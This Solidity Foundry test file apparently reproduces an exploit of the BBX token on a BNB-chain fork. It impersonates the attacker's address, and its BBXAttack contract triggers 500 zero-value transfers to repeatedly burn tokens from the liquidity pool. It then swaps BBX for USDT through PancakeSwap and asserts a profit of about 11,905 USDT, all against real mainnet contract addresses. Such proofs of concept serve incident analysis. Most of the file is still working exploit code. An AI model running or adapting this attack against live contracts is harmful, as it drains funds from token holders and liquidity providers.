
pragma solidity ^0.8.20;

import "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 47626726;
    uint256 constant TX_TIMESTAMP = 1742461860;
    uint256 constant TX_BLOCK_NUMBER = 47626727;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        BBXAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _runAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (BBXAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = BBXAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new BBXAttack();
        }
    }

    function _prepareProfit(BBXAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _runAttack(BBXAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(BBXAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDT, "USDT", 11905927933743202788913);
    }
}

contract BBXAttack {


    function attack() external payable {
        _executeAttackFlow();
    }

    function _executeAttackFlow() internal {
        _probeBbxState();
        _churnBbxBurns();
        _approveRouter();
        _swapBbxToUsdt();
    }

    function _probeBbxState() internal view {
        IBBX(Addresses.BBX).lastBurnTime();
        IBBX(Addresses.BBX).lastBurnGapTime();
        IBBX(Addresses.BBX).liquidityPool();
        IBBX(Addresses.BBX).burnRate();
    }

    function _churnBbxBurns() internal {
        IERC20Like bbx = IERC20Like(Addresses.BBX);
        for (uint256 i = 0; i < 500; i++) {
            bbx.transfer(address(this), 0);
        }
    }

    function _approveRouter() internal {
        IERC20Like bbx = IERC20Like(Addresses.BBX);
        bbx.approve(Addresses.PANCAKE_ROUTER, type(uint256).max);
        bbx.balanceOf(address(this));
    }

    function _swapBbxToUsdt() internal {
        address[] memory path = new address[](2);
        path[0] = Addresses.BBX;
        path[1] = Addresses.USDT;
        IPancakeRouter(Addresses.PANCAKE_ROUTER)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                18480773819186942481, 0, path, Addresses.attacker_eoa, 1742461860
            );
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.sig == 0x5f83db9b) {
            _executeAttackFlow();
            return;
        }
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant attack_contract = 0x0489E8433e4E74fB1ba938dF712c954DDEA93898;
    address internal constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant Cake_LP = 0x6051428B580f561B627247119EEd4D0483B8D28e;
    address internal constant BBX = 0x67Ca347e7B9387af4E81c36cCA4eAF080dcB33E9;
    address internal constant A_849D09_02C6 = 0x849D09e4Dbd4Ec5449ec7d807DD137bE6dB002c6;
    address internal constant attacker_eoa = 0x8AEa7516B3B6aABF474f8872c5e71c1a7907e69E;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant A_E6ACC5_6837 = 0xE6Acc53b8f9327ddF029FfeD36186471d92B6837;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IBBX {
    function burnRate() external view returns (uint256);
    function lastBurnGapTime() external view returns (uint256);
    function lastBurnTime() external view returns (uint256);
    function liquidityPool() external view returns (uint256);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
